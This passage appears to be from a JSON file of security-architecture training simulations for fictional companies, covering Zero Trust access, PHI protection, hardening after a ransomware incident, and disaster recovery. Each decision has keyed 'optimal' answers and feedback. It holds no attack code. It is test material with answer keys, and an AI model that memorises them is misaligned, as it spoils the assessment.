antithetical to Zero Trust's 'least privilege' principle. Once on VPN, users can reach any resource on the network, enabling lateral movement if compromised. Zero Trust requires application-level access control, not network-level access.\", 'consequence': 'VPN remains single point of compromise. Attackers who breach VPN have broad network access.'"}, {"id": "B", "text": "Identity-aware proxy for web apps, SDP for legacy apps, eliminate traditional VPN", "is_optimal": true, "feedback": "{'short': 'Correct! Application-level access for all resources, no network-level VPN', 'detailed': \"Modern Zero Trust remote access: (1) Identity-aware proxy (Zscaler, Azure AD App Proxy) for web applications - verify identity before granting access to specific app, (2) SDP/ZTNA for legacy client-server apps - create authorized tunnels to specific applications, not the whole network, (3) Eliminate traditional VPN - no more 'connect and access everything'. Every access request is authenticated an"}, {"id": "C", "text": "Require all users to work from corporate locations - no remote access needed", "is_optimal": false, "feedback": "{'short': 'Remote work is business reality', 'detailed': \"Eliminating remote access isn't realistic for a global company with 12 locations and modern work expectations. Researchers, executives, and many employees need remote access. The goal is secure remote access, not eliminating remote work. Zero Trust enables secure access from anywhere.\", 'consequence': \"Business can't function. Talent leaves for more flexible employers.\"}"}, {"id": "D", "text": "Identity-aware proxy for web apps, keep VPN for everything else", "is_optimal": false, "feedback": "{'short': 'Hybrid approach still leaves VPN risk for legacy apps', 'detailed': 'Keeping VPN for legacy apps maintains the network-level access problem for those applications. SDP/ZTNA solutions can handle legacy client-server applications without providing broad network access. The goal is eliminating network-level access entirely, not just for web apps.', 'consequence': 'VPN remains for legacy apps. Attackers target VPN for those applications. Partial Zero Trust.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D3-SIM-003", "domain": 3, "type": "SIM", "title": "Data Protection Program", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "NovaCare Health Systems"}, "introduction": "NovaCare Health Systems has grown rapidly through acquisitions, resulting in fragmented data protection practices. A recent OCR audit identified significant gaps in PHI handling, and several incidents have highlighted the lack of data governance. As the newly hired Data Protection Architect, you're tasked with designing and implementing a comprehensive data protection program that meets regulatory requirements while enabling clinical and research operations.", "decision_points": [{"id": "decision_1", "title": "Data Classification Approach", "situation": "NovaCare has never had formal data classification. Some staff argue that everything should be treated as PHI for simplicity. Others want granular classification. You need to recommend the classification approach.", "question": "What data classification approach should NovaCare implement?", "options": [{"id": "A", "text": "Treat all data as PHI - simplifies handling, maximum protection", "is_optimal": false, "feedback": "{'short': 'Over-classification creates operational burden', 'detailed': \"Treating all data as PHI means: every email requires PHI-level protection, public information can't be shared, excessive encryption overhead, user fatigue from constant restrictions. Over-classification leads to workarounds as users find controls too burdensome. Additionally, it doesn't help identify where actual PHI resides.\", 'consequence': 'Users ignore or circumvent controls. Actual PHI gets lost in the noise. Operation"}, {"id": "B", "text": "Tiered classification (Public, Internal, Confidential, Restricted) aligned to regulatory requirements", "is_optimal": true, "feedback": "{'short': 'Correct! Risk-appropriate protection for different data types', 'detailed': 'Tiered classification enables: appropriate controls for each level (PHI gets strongest, public gets minimal), clear guidance for users, regulatory alignment (HIPAA, PCI), efficient resource allocation (focus protection on sensitive data). Four levels provide enough granularity without overwhelming users. Classification should align with existing regulations.', 'consequence': 'Clear data handling guidelines. A"}, {"id": "C", "text": "Binary classification (Sensitive / Non-sensitive) for simplicity", "is_optimal": false, "feedback": "{'short': \"Too simple - doesn't distinguish between sensitivity levels\", 'detailed': \"Binary classification lumps PHI with employee PII with financial data - all 'sensitive' but with different regulatory requirements and risk levels. This doesn't enable differentiated handling (PHI has HIPAA requirements, PCI data has different requirements) and may lead to under-protection of highest-risk data.\", 'consequence': 'Different regulatory requirements treated the same. Compliance gaps for specific re"}, {"id": "D", "text": "Let each department create their own classification scheme", "is_optimal": false, "feedback": "{'short': 'Inconsistent classification prevents enterprise protection', 'detailed': \"Department-specific classification creates: inconsistent protection (IT's 'confidential' vs. HR's 'confidential'), data sharing confusion, impossible enterprise DLP/encryption policies, audit challenges. Data protection requires consistent enterprise-wide classification.\", 'consequence': 'Fragmented protection. Cannot implement enterprise DLP. Audit failures.'}"}]}, {"id": "decision_2", "title": "PHI Encryption Priority", "situation": "The OCR audit cited lack of encryption as a major finding. HITECH provides safe harbor from breach notification if PHI was properly encrypted. You need to prioritize encryption implementation.", "question": "What encryption should be the HIGHEST priority for HITECH safe harbor?", "options": [{"id": "A", "text": "Database encryption (TDE) for the EHR system", "is_optimal": false, "feedback": "{'short': 'Important but not the highest-risk gap', 'detailed': 'Database TDE protects EHR data at rest in the database files. This is important, but databases are typically in secured data centers with physical and logical controls. The highest-risk gap is portable devices - laptops that can be lost or stolen have resulted in the most HIPAA breaches.', 'consequence': 'Database encrypted but laptop loss still triggers breach notification.'}"}, {"id": "B", "text": "Email encryption for messages containing PHI", "is_optimal": false, "feedback": "{'short': 'Important for transit but not the highest-risk gap', 'detailed': \"Email encryption protects PHI in transit - important for compliance. However, email breaches are typically about unauthorized disclosure (sending to wrong person), not interception. Encryption doesn't prevent that. Portable device loss is the highest frequency breach type.\", 'consequence': 'Email encrypted but lost laptops still cause breaches.'}"}, {"id": "C", "text": "Full disk encryption for all laptops and portable devices", "is_optimal": true, "feedback": "{'short': 'Correct! Portable devices are highest breach risk', 'detailed': \"Laptop and mobile device loss/theft is the most common cause of PHI breaches. Full disk encryption (BitLocker, FileVault) provides HITECH safe harbor - if an encrypted device is lost, it's not a reportable breach. This is the highest-impact encryption implementation for breach prevention and should be prioritized.\", 'consequence': 'Lost/stolen devices no longer trigger breach notification. Highest-risk gap addressed firs"}, {"id": "D", "text": "Application-level encryption within the EHR", "is_optimal": false, "feedback": "{'short': 'Strongest but most complex - not highest priority', 'detailed': \"Application-level encryption provides defense-in-depth but requires significant development effort, impacts performance and functionality, and doesn't address the immediate highest risk (portable devices). This is valuable for long-term architecture but not the first priority.\", 'consequence': 'Complex implementation delays addressing immediate risks.'}"}]}, {"id": "decision_3", "title": "Key Management Architecture", "situation": "With encryption being implemented across the enterprise, key management becomes critical. If keys are lost, data is unrecoverable. If keys are compromised, encryption is useless. You need to design the key management approach.", "question": "What key management architecture should NovaCare implement?", "options": [{"id": "A", "text": "Cloud-native KMS (Azure Key Vault) for all encryption keys", "is_optimal": false, "feedback": "{'short': \"Good for cloud but doesn't cover all scenarios\", 'detailed': \"Azure Key Vault is excellent for Azure-hosted resources but NovaCare has significant on-premises infrastructure. Relying solely on cloud KMS creates: dependency on internet connectivity, doesn't easily support on-prem systems (BitLocker, on-prem databases), and may have regulatory concerns for some scenarios.\", 'consequence': 'Cloud keys managed well but on-premises key management gaps remain.'}"}, {"id": "B", "text": "On-premises HSM with manual key ceremonies", "is_optimal": false, "feedback": "{'short': \"Secure but doesn't scale or support cloud\", 'detailed': \"On-premises HSM provides strong key protection but: manual ceremonies don't scale for thousands of keys, doesn't integrate with cloud services, requires specialized expertise to manage, and creates single-site risk. Healthcare environments need automation and cloud integration.\", 'consequence': 'Highly secure but operationally challenging. Cloud key management gaps.'}"}, {"id": "C", "text": "Hybrid: Cloud KMS for cloud resources, on-prem KMS with HSM backing for on-premises", "is_optimal": true, "feedback": "{'short': 'Correct! Hybrid approach addresses all environments', 'detailed': 'Hybrid key management provides: cloud-native integration for Azure resources (Key Vault), on-premises capability for legacy systems (Active Directory-integrated KMS or enterprise key manager with HSM), centralized policy management, and separation of duties. HSM backing provides hardware-level key protection for highest sensitivity.', 'consequence': 'Comprehensive key management across all environments. Keys protected "}, {"id": "D", "text": "Rely on each application's built-in key management", "is_optimal": false, "feedback": "{'short': 'Fragmented approach creates gaps and complexity', 'detailed': 'Application-specific key management means: inconsistent key protection, no central visibility, different recovery procedures per system, difficult to audit, and no separation of duties between application admin and key admin. Enterprise key management requires centralization.', 'consequence': 'Key sprawl. Inconsistent protection. Audit failures.'}"}]}, {"id": "decision_4", "title": "DLP Implementation Strategy", "situation": "Recent incidents showed sensitive data leaving the organization via email and cloud storage. You need to design the DLP implementation to prevent PHI exfiltration while maintaining clinical workflow.", "question": "What DLP implementation approach should be prioritized?", "options": [{"id": "A", "text": "Network DLP at the perimeter to catch all outbound traffic", "is_optimal": false, "feedback": "{'short': 'Network DLP has blind spots in modern environments', 'detailed': 'Network DLP monitors traffic at egress points but: encrypted traffic (HTTPS, TLS) is invisible without SSL inspection, cloud-to-cloud traffic never crosses the perimeter, and remote workers may not route through corporate network. Network DLP alone has significant blind spots.', 'consequence': 'Some exfiltration detected but significant gaps. Cloud and encrypted traffic invisible.'}"}, {"id": "B", "text": "Endpoint DLP on all workstations to control data at the source", "is_optimal": false, "feedback": "{'short': 'Good source control but misses cloud and mobile', 'detailed': \"Endpoint DLP controls data at the source (copy, print, USB) but: doesn't cover cloud applications directly, mobile devices may not support agents, and BYOD scenarios are challenging. Endpoint DLP is valuable but not comprehensive alone.\", 'consequence': 'Workstation control improved but cloud and mobile gaps remain.'}"}, {"id": "C", "text": "Integrated DLP across endpoint, cloud, and email with unified policy", "is_optimal": true, "feedback": "{'short': 'Correct! Comprehensive coverage with consistent policy', 'detailed': 'Integrated DLP provides: endpoint control (USB, print, clipboard), cloud app visibility (sanctioned and unsanctioned), email protection (outbound scanning), and unified policy (same rules everywhere). Modern DLP platforms (Microsoft Purview, Symantec, etc.) offer integrated coverage. Consistent policy prevents attackers from finding the gap.', 'consequence': 'Comprehensive data visibility. Consistent policy enforcem"}, {"id": "D", "text": "Cloud Access Security Broker (CASB) for SaaS applications only", "is_optimal": false, "feedback": "{'short': 'CASB is one component, not complete DLP', 'detailed': \"CASB provides visibility and control for cloud applications - valuable for the 30% SaaS environment. But CASB alone doesn't cover: endpoint actions (USB, print), email (unless cloud-native), on-premises applications, or network file shares. DLP needs to be comprehensive.\", 'consequence': 'Cloud apps protected but on-prem and endpoint gaps remain.'}"}]}, {"id": "decision_5", "title": "Non-Production Data Protection", "situation": "Development and testing teams need realistic data but currently use production copies with real PHI. This creates significant compliance risk. You need to recommend an approach for non-production environments.", "question": "How should PHI be handled in development and test environments?", "options": [{"id": "A", "text": "Apply same security controls to dev/test as production", "is_optimal": false, "feedback": "{'short': \"Maintains risk and doesn't solve the problem\", 'detailed': 'Applying production controls to dev/test means: PHI still in dev/test (risk remains), developers need PHI access (expanded access), audit logging required for dev work (overhead), and compliance scope includes all environments (more audit surface). The goal should be removing PHI from non-production.', 'consequence': 'Dev/test still contains PHI. Risk and compliance scope unchanged.'}"}, {"id": "B", "text": "Static data masking to create de-identified copies for dev/test", "is_optimal": true, "feedback": "{'short': 'Correct! De-identified data removes compliance risk', 'detailed': \"Static data masking permanently replaces PHI in non-production copies: removes identifiers (names, SSN, MRN), maintains data relationships and realism, de-identified data not subject to HIPAA, developers don't need PHI access, and reduced compliance scope. This is the industry standard approach for healthcare dev/test.\", 'consequence': 'PHI removed from dev/test. Compliance scope reduced. Developer productivity maintai"}, {"id": "C", "text": "Use synthetic data generation instead of production copies", "is_optimal": false, "feedback": "{'short': 'Valid approach but more complex than masking', 'detailed': 'Synthetic data generation creates entirely artificial data matching production patterns. This provides strong protection (no real data involved) but: may not capture edge cases, requires sophisticated generation, and may not test all scenarios realistically. Masking is typically easier to implement and maintains real data patterns.', 'consequence': 'Good protection but may miss edge cases. More complex implementation.'}"}, {"id": "D", "text": "Limit dev/test PHI access to senior developers only", "is_optimal": false, "feedback": "{'short': 'Still exposes PHI and creates workflow issues', 'detailed': \"Restricting access doesn't remove the PHI or the risk - it just limits who can see it. PHI is still in dev/test (breach risk), junior developers can't do their work (productivity impact), and you still have HIPAA compliance requirements for those environments. This doesn't solve the problem.\", 'consequence': 'PHI still at risk. Developer productivity impacted. Compliance requirements unchanged.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D3-SIM-004", "domain": 3, "type": "SIM", "title": "Infrastructure Hardening", "difficulty": "intermediate", "role": "Security Analyst", "organization": {"name": "Pacific Manufacturing Industries"}, "introduction": "Pacific Manufacturing's ransomware incident exposed critical infrastructure weaknesses. The attackers exploited default configurations, legacy protocols, and a flat network to spread from a phished workstation to manufacturing systems in under 4 hours. As the Infrastructure Security Engineer, you're leading the remediation effort. Your challenge: harden systems, implement segmentation, and establish secure baselines without disrupting 24/7 manufacturing operations.", "decision_points": [{"id": "decision_1", "title": "Secure Baseline Standard Selection", "situation": "Pacific has no documented security baselines - each plant and team configures systems differently. You need to establish a consistent baseline standard for all systems.", "question": "What secure baseline standard should Pacific adopt?", "options": [{"id": "A", "text": "Create custom baselines from scratch based on Pacific's needs", "is_optimal": false, "feedback": "{'short': 'Reinventing the wheel without industry expertise', 'detailed': 'Creating baselines from scratch means: duplicating work already done by industry experts, likely missing important settings, no community validation or updates, and difficult to defend to auditors. Established baselines (CIS, STIG) represent collective industry wisdom and are regularly updated.', 'consequence': 'Gaps in baselines, no update process, difficult audit defense.'}"}, {"id": "B", "text": "CIS Benchmarks Level 1 with Level 2 for critical systems", "is_optimal": true, "feedback": "{'short': 'Correct! Industry standard with appropriate rigor levels', 'detailed': 'CIS Benchmarks are industry standard, regularly updated, and provide two levels: Level 1 (essential security, minimal functionality impact) for most systems, Level 2 (defense in depth, may impact some functionality) for critical systems. This provides appropriate security without unnecessary operational impact. CIS also provides automated assessment tools.', 'consequence': 'Consistent baselines across organization"}, {"id": "C", "text": "DISA STIGs for maximum security", "is_optimal": false, "feedback": "{'short': 'STIGs are stricter than needed for non-DoD manufacturing', 'detailed': 'DISA STIGs are designed for Department of Defense systems with very high security requirements. For a manufacturing company, STIGs may be unnecessarily restrictive, cause operational issues, and require more exceptions. CIS Level 1/2 provides appropriate security without DoD-level restrictions.', 'consequence': 'Over-hardening causes operational issues. Many exceptions required. Unsustainable.'}"}, {"id": "D", "text": "Vendor default configurations with basic security enabled", "is_optimal": false, "feedback": "{'short': 'Defaults are not secure baselines', 'detailed': \"Vendor defaults prioritize ease of use over security. Default configurations typically: leave unnecessary services enabled, use weak settings, enable legacy protocols for compatibility, and don't implement defense-in-depth. This is what Pacific has now - and it contributed to the ransomware spread.\", 'consequence': 'No improvement over current insecure state.'}"}]}, {"id": "decision_2", "title": "Legacy Protocol Remediation", "situation": "The scan shows SMBv1 enabled on 78% of systems - this enabled the ransomware to spread via EternalBlue. IT argues some legacy systems require SMBv1. You need to decide the approach.", "question": "How should Pacific address SMBv1 across the environment?", "options": [{"id": "A", "text": "Disable SMBv1 everywhere immediately - security is paramount", "is_optimal": false, "feedback": "{'short': 'May break critical systems without assessment', 'detailed': 'Immediate blanket disable may break: legacy applications, older network devices (printers, NAS), and some OT systems that require SMBv1. Critical manufacturing could stop. The right approach is to identify dependencies first, then disable with appropriate mitigations for exceptions.', 'consequence': 'Production outages from broken dependencies. Emergency rollback required.'}"}, {"id": "B", "text": "Keep SMBv1 for compatibility - focus on other security improvements", "is_optimal": false, "feedback": "{'short': 'SMBv1 is a critical vulnerability that enabled the attack', 'detailed': 'SMBv1 was the key propagation mechanism for the ransomware. Keeping it enabled maintains the exact vulnerability that caused the incident. EternalBlue and related vulnerabilities make SMBv1 a critical risk that must be addressed. Compatibility concerns require mitigation, not acceptance.', 'consequence': 'Ransomware attack vector remains open. Next attack will spread the same way.'}"}, {"id": "C", "text": "Audit SMBv1 dependencies, disable where possible, isolate systems that require it", "is_optimal": true, "feedback": "{'short': 'Correct! Risk-based approach with compensating controls', 'detailed': \"Audit first to identify what actually requires SMBv1 (usually less than expected). Disable on all systems that don't need it (majority). For systems that require it: isolate on separate network segment, apply additional monitoring, plan for replacement. This eliminates risk where possible and contains it where necessary.\", 'consequence': 'SMBv1 disabled on most systems. Remaining systems isolated and monitored. Ris"}, {"id": "D", "text": "Replace all systems that require SMBv1 before making changes", "is_optimal": false, "feedback": "{'short': 'Takes too long - risk remains during replacement', 'detailed': 'Full replacement of legacy systems could take months or years and significant budget. During that time, SMBv1 remains enabled everywhere, maintaining the vulnerability. Disable where possible immediately, then work on replacing remaining legacy systems over time.', 'consequence': 'Extended exposure while waiting for replacements.'}"}]}, {"id": "decision_3", "title": "IT/OT Segmentation Design", "situation": "The flat network allowed ransomware to spread from an IT workstation to OT systems in 4 hours. You need to design network segmentation between IT and OT environments.", "question": "What segmentation architecture should separate IT from OT?", "options": [{"id": "A", "text": "VLAN separation with routing between IT and OT", "is_optimal": false, "feedback": "{'short': \"VLANs alone don't provide security filtering\", 'detailed': \"VLANs provide Layer 2 separation, but if you route between them without firewall rules, traffic flows freely. This is slightly better than flat network but doesn't provide the control needed between IT and OT. Security filtering at network boundaries is essential.\", 'consequence': 'Logical separation but traffic still flows. Attack could still spread.'}"}, {"id": "B", "text": "Industrial DMZ (Purdue Model Level 3.5) with firewalls and controlled data exchange", "is_optimal": true, "feedback": "{'short': 'Correct! Industry-standard OT security architecture', 'detailed': 'The Purdue Model with industrial DMZ (Level 3.5) provides: firewall-enforced boundary between IT and OT, controlled data exchange through DMZ services (historian mirror, jump server), no direct IT-to-OT traffic, and industry-standard architecture. Firewalls enforce strict rules on what can cross the boundary.', 'consequence': 'IT and OT properly separated. Controlled data exchange. Attack from IT cannot directly reach "}, {"id": "C", "text": "Complete air gap with no network connectivity between IT and OT", "is_optimal": false, "feedback": "{'short': 'Air gap often impractical for modern manufacturing', 'detailed': \"Complete air gap provides strongest isolation but: prevents legitimate data flow (production data to ERP, remote monitoring), creates workarounds (USB drives - often worse security), and doesn't align with Industry 4.0 initiatives. Controlled connectivity through industrial DMZ is usually more practical.\", 'consequence': 'Operational inefficiency. USB workarounds create different risks.'}"}, {"id": "D", "text": "Software-defined microsegmentation without network redesign", "is_optimal": false, "feedback": "{'short': 'Microsegmentation is valuable but OT devices may not support agents', 'detailed': \"Software-defined microsegmentation requires agents on endpoints. Many OT devices (PLCs, HMIs, legacy systems) cannot run agents or the vendor won't support it. Network-based segmentation (firewalls) works regardless of endpoint capabilities. Microsegmentation complements but doesn't replace network segmentation for OT.\", 'consequence': 'IT endpoints protected but OT devices unprotected.'}"}]}, {"id": "decision_4", "title": "Endpoint Hardening Priority", "situation": "With 3,200 workstations and 280 servers to harden, you need to prioritize. Resources are limited, and you can't harden everything at once.", "question": "What endpoint hardening should be implemented FIRST?", "options": [{"id": "A", "text": "Full CIS benchmark hardening on all workstations", "is_optimal": false, "feedback": "{'short': 'Good target but too broad for first priority', 'detailed': 'Full benchmark hardening is the end goal, but implementing everything on all workstations at once is risky (may break things) and slow (thorough testing needed). Start with high-impact quick wins while planning comprehensive hardening. The incident analysis shows specific issues to address first.', 'consequence': 'Long implementation timeline while high-impact risks remain.'}"}, {"id": "B", "text": "Disable SMBv1, enable PowerShell logging, block Office macros - address attack vectors", "is_optimal": true, "feedback": "{'short': 'Correct! Address specific attack vectors from the incident', 'detailed': 'Focus first on controls that would have prevented or detected the attack: SMBv1 disable (stopped propagation), PowerShell logging (detected Cobalt Strike), macro blocking (prevented initial execution). These high-impact changes can be deployed quickly and address known risks. Then continue with comprehensive hardening.', 'consequence': 'Specific attack vectors closed quickly. High-impact security improvement. Fo"}, {"id": "C", "text": "Deploy EDR on all endpoints before hardening", "is_optimal": false, "feedback": "{'short': 'EDR detects but hardening prevents - both needed', 'detailed': \"EDR provides detection and response capabilities - important! But EDR alone doesn't prevent vulnerabilities (SMBv1, macros). Hardening eliminates attack surface; EDR catches what gets through. Both are needed, but quick hardening wins can be faster than full EDR deployment.\", 'consequence': 'Can detect attacks but underlying vulnerabilities remain.'}"}, {"id": "D", "text": "Focus on servers first - workstations are lower priority", "is_optimal": false, "feedback": "{'short': 'Workstations are often the initial entry point', 'detailed': 'The attack started on a workstation (phishing). Servers are important, but workstations are typically the initial entry point for attacks. Hardening workstations (especially macro blocking, SMBv1 disable) addresses the attack chain start. A defense-in-depth approach addresses both.', 'consequence': 'Servers hardened but attack entry point (workstations) remains vulnerable.'}"}]}, {"id": "decision_5", "title": "Privileged Account Management", "situation": "Investigation revealed attackers harvested domain admin credentials from memory on a compromised workstation - the admin had logged in earlier for support. Shared admin accounts and poor privileged access hygiene enabled lateral movement.", "question": "What should be the FIRST step to improve privileged access security?", "options": [{"id": "A", "text": "Deploy full PAM solution with credential vaulting", "is_optimal": false, "feedback": "{'short': 'PAM is valuable but takes months to deploy properly', 'detailed': 'Full PAM deployment (vaulting, session recording, JIT access) is the target state but requires significant implementation time. While planning PAM, immediate improvements can reduce risk now. The tiered model and LAPS can be implemented faster than full PAM.', 'consequence': 'Long deployment timeline while admin credential risks remain.'}"}, {"id": "B", "text": "Implement tiered administration model - separate accounts, admins don't log into workstations", "is_optimal": true, "feedback": "{'short': 'Correct! Immediately reduces credential exposure risk', 'detailed': 'Tiered administration provides immediate improvement: Tier 0 (domain admin) never logs into workstations or member servers, separate admin accounts per tier, domain admin credentials never exposed on lower-tier systems. This directly addresses how credentials were harvested. Can be implemented through policy and GPO while planning PAM deployment.', 'consequence': 'Credential exposure significantly reduced. Foundation"}, {"id": "C", "text": "Require MFA for all admin accounts", "is_optimal": false, "feedback": "{'short': \"MFA is important but doesn't address credential exposure\", 'detailed': \"MFA adds authentication security, but the issue was credential harvesting from memory (Pass-the-Hash, Mimikatz). Once attackers have the credential hash, they can use it directly without MFA in many scenarios (NTLM authentication). Tiered model prevents exposure; MFA adds a layer but doesn't solve the core issue.\", 'consequence': 'MFA deployed but credential exposure on workstations continues.'}"}, {"id": "D", "text": "Change all admin passwords immediately", "is_optimal": false, "feedback": "{'short': 'Passwords will be harvested again without architectural change', 'detailed': 'Password reset is incident response 101, but without changing the architecture, new passwords will be exposed the same way when admins log into workstations. The systemic issue (admins logging into untrusted systems) must be addressed, not just the credentials.', 'consequence': 'Passwords changed but same exposure continues. Will be compromised again.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D3-SIM-005", "domain": 3, "type": "SIM", "title": "Resilience and Recovery", "difficulty": "advanced", "role": "Security Analyst", "organization": {"name": "Continental Logistics Corporation"}, "introduction": "Continental Logistics' summer outage exposed critical gaps in business continuity planning. The company's 24/7 operations and contractual SLAs with major retailers mean downtime directly translates to revenue loss and customer defection. As the newly appointed Business Continuity Architect, you're tasked with designing a resilient architecture that can withstand site failures, cyber attacks, and natural disasters. Patricia Vance has made it clear: the board expects a fundamental transformation, not incremental improvements.", "decision_points": [{"id": "decision_1", "title": "Defining Recovery Objectives", "situation": "Continental has never formally defined RTO and RPO for critical systems. During the outage, there was confusion about recovery priorities. Patricia asks you to establish recovery objectives.", "question": "How should RTO and RPO be determined for Continental's systems?", "options": [{"id": "A", "text": "IT should define RTO/RPO based on technical recovery capabilities", "is_optimal": false, "feedback": "{'short': 'RTO/RPO are business decisions, not technical', 'detailed': \"IT knows what's technically achievable, but RTO/RPO must be driven by business impact. A system IT can recover in 24 hours might need 1-hour RTO based on revenue loss and SLAs. Business leaders must define requirements based on impact; IT determines how to meet them.\", 'consequence': 'Technical-driven objectives may not match business needs.'}"}, {"id": "B", "text": "Business impact analysis driving RTO/RPO with cost-benefit for achieving each tier", "is_optimal": true, "feedback": "{'short': 'Correct! Business impact determines requirements, cost informs decisions', 'detailed': 'BIA identifies: revenue impact per hour, SLA penalties, operational dependencies, and regulatory requirements. This determines WHAT RTO/RPO is needed. Cost analysis shows WHAT IT COSTS to achieve each tier. Business leaders make informed decisions balancing impact against investment. IT then implements to meet objectives.', 'consequence': 'Recovery objectives aligned with business needs. Investment"}, {"id": "C", "text": "Set the same RTO/RPO for all systems to simplify recovery", "is_optimal": false, "feedback": "{'short': 'One-size-fits-all wastes money or under-protects', 'detailed': 'Systems have different business impact. Applying the most stringent RTO/RPO to everything is expensive and unnecessary. Applying the least stringent puts critical systems at risk. Tiered approach matches investment to impact.', 'consequence': 'Either over-invest in non-critical systems or under-protect critical ones.'}"}, {"id": "D", "text": "Use industry benchmarks for logistics companies", "is_optimal": false, "feedback": "{'short': \"Benchmarks help but don't replace business analysis\", 'detailed': \"Industry benchmarks provide reference points, but Continental's specific SLAs, customer contracts, and revenue model determine its requirements. A competitor with different contracts may have different needs. BIA captures Continental-specific requirements.\", 'consequence': 'Generic objectives may not match specific business commitments.'}"}]}, {"id": "decision_2", "title": "High Availability Architecture", "situation": "The TMS system is revenue-critical with $125K/hour impact and strict customer SLAs. Currently it runs only in Chicago with no standby. You need to design the HA architecture for TMS.", "question": "What high availability architecture should be implemented for TMS?", "options": [{"id": "A", "text": "Active-active across Chicago and cloud DR site", "is_optimal": false, "feedback": "{'short': 'Active-active is complex and may not be necessary', 'detailed': 'Active-active provides near-zero RTO but requires: application redesign for multi-site operation, synchronous data replication (latency-constrained), complex conflict resolution, and highest cost. For TMS with 4-hour MTPD, active-passive hot standby likely meets needs at lower complexity.', 'consequence': 'Highest cost and complexity. May be over-engineering for requirements.'}"}, {"id": "B", "text": "Active-passive hot standby with asynchronous replication and automated failover", "is_optimal": true, "feedback": "{'short': 'Correct! Meets RTO requirements with manageable complexity', 'detailed': 'Hot standby provides: systems running and ready at DR site, asynchronous replication (minutes of data lag, acceptable for most scenarios), automated failover (15-30 minute RTO achievable), and proven architecture pattern. Meets the <1 hour RTO needed for $125K/hour impact without active-active complexity.', 'consequence': 'RTO achievable within requirements. Balanced complexity and cost.'}"}, {"id": "C", "text": "Warm standby with 4-hour recovery capability", "is_optimal": false, "feedback": "{'short': '4-hour RTO equals MTPD - no margin for error', 'detailed': 'TMS has 4-hour MTPD (Maximum Tolerable Period of Disruption). A 4-hour RTO leaves no margin - any complication extends beyond tolerable period. RTO should be significantly less than MTPD to account for real-world recovery challenges.', 'consequence': 'No safety margin. Likely to exceed MTPD during real incident.'}"}, {"id": "D", "text": "Improve Chicago resilience - dual power, better generators - avoid DR site cost", "is_optimal": false, "feedback": "{'short': \"Single site can't protect against all scenarios\", 'detailed': \"Improved local resilience is valuable but doesn't protect against: major disasters (fire, flood), prolonged regional outages, or incidents affecting the building. Geographic redundancy is essential for critical systems. Defense in depth means both local resilience AND remote DR.\", 'consequence': 'Still single point of failure at site level.'}"}]}, {"id": "decision_3", "title": "Backup Strategy", "situation": "The incident revealed that backups had never been tested for recoverability. Additionally, ransomware is a major concern - attackers increasingly target backups. You need to design the backup strategy.", "question": "What backup strategy should Continental implement?", "options": [{"id": "A", "text": "Daily full backups to cloud storage with 30-day retention", "is_optimal": false, "feedback": "{'short': 'Missing key elements - immutability, offsite, and testing', 'detailed': 'Daily full backups to cloud is a start but: no immutable copy (ransomware can encrypt cloud backups if credentials compromised), cloud-only violates 3-2-1 (two media types), and no mention of testing. Modern backup strategy must address ransomware specifically.', 'consequence': 'Backups may be encrypted in ransomware attack. Single media type risk.'}"}, {"id": "B", "text": "3-2-1-1-0 strategy: three copies, two media types, one offsite, one immutable/offline, zero errors on restore testing", "is_optimal": true, "feedback": "{'short': 'Correct! Comprehensive strategy addressing ransomware and recoverability', 'detailed': '3-2-1-1-0 addresses all concerns: 3 copies (production + 2 backups) for redundancy, 2 media types (disk + tape or cloud) for diversity, 1 offsite for geographic separation, 1 immutable/offline for ransomware protection, 0 errors on restore testing to verify recoverability. This is the modern best practice for backup strategy.', 'consequence': 'Protected against ransomware, hardware failure, and sit"}, {"id": "C", "text": "Continuous data replication to DR site only - backups are outdated", "is_optimal": false, "feedback": "{'short': 'Replication alone is not backup', 'detailed': 'Replication provides availability but not protection against: data corruption (corrupted data replicates), ransomware (encryption replicates), accidental deletion (deletion replicates). Backups provide point-in-time recovery. Both replication and backup are needed.', 'consequence': 'No point-in-time recovery. Corruption/ransomware affects both sites.'}"}, {"id": "D", "text": "Hourly snapshots with weekly tape rotation to offsite storage", "is_optimal": false, "feedback": "{'short': 'Good elements but missing immutability and testing', 'detailed': 'Hourly snapshots provide good RPO, weekly tape provides offsite. But: snapshots alone may be on same storage (not protected from storage failure), no immutable copy mentioned, and no restore testing. These are good components but not complete strategy.', 'consequence': 'Some protection but gaps in ransomware resilience and verified recovery.'}"}]}, {"id": "decision_4", "title": "DR Site Selection", "situation": "The Dallas cold site is inadequate. You need to recommend a new DR approach. Options include a new physical site, colocation, or cloud. Geographic and capability factors must be considered.", "question": "What DR site strategy should Continental implement?", "options": [{"id": "A", "text": "Build a new company-owned data center in Dallas", "is_optimal": false, "feedback": "{'short': 'Long lead time and high capital expense', 'detailed': 'Building a data center takes 18-24 months and significant capital. Continental needs DR capability now, not in two years. The initiative timeline is 18 months - building a DC would consume the entire timeline before providing any DR capability. Faster options available.', 'consequence': 'No DR improvement during project timeline.'}"}, {"id": "B", "text": "Cloud-based DR in Azure East US region with hybrid architecture", "is_optimal": true, "feedback": "{'short': 'Correct! Fast deployment, elastic capacity, geographic separation', 'detailed': \"Cloud DR provides: rapid deployment (weeks not years), elastic capacity (pay for what you use, scale for failover), geographic separation (East US from Chicago), and proven platform. Hybrid approach maintains existing Chicago investment while adding cloud DR. Azure's DR services (Site Recovery, Backup) accelerate implementation.\", 'consequence': 'DR capability deployed quickly. Scalable capacity. Geograph"}, {"id": "C", "text": "Colocation in Phoenix with replicated infrastructure", "is_optimal": false, "feedback": "{'short': 'Valid option but slower and less flexible than cloud', 'detailed': 'Colocation provides good DR capability but: requires hardware procurement and deployment (months), fixed capacity (over-provision or under-capacity), and ongoing facility costs. Cloud provides faster deployment and elastic capacity. Colocation is a valid choice for steady-state but slower for initial deployment.', 'consequence': 'Longer time to DR capability. Fixed capacity.'}"}, {"id": "D", "text": "Multi-cloud DR across AWS and Azure for platform diversity", "is_optimal": false, "feedback": "{'short': 'Adds complexity without proportional benefit', 'detailed': 'Multi-cloud provides platform diversity but: doubles the complexity (two platforms to learn, integrate, operate), increases skill requirements, and complicates data consistency. For DR (not day-to-day), single cloud with multi-region provides similar geographic resilience with less complexity.', 'consequence': 'Operational complexity. Skill requirements. Limited benefit for DR use case.'}"}]}, {"id": "decision_5", "title": "Power Resilience", "situation": "The Chicago outage was caused by generator fuel exhaustion. The current fuel contract guarantees 8-hour delivery, but the outage lasted 18 hours. You need to improve power resilience at Chicago.", "question": "What is the MOST critical power 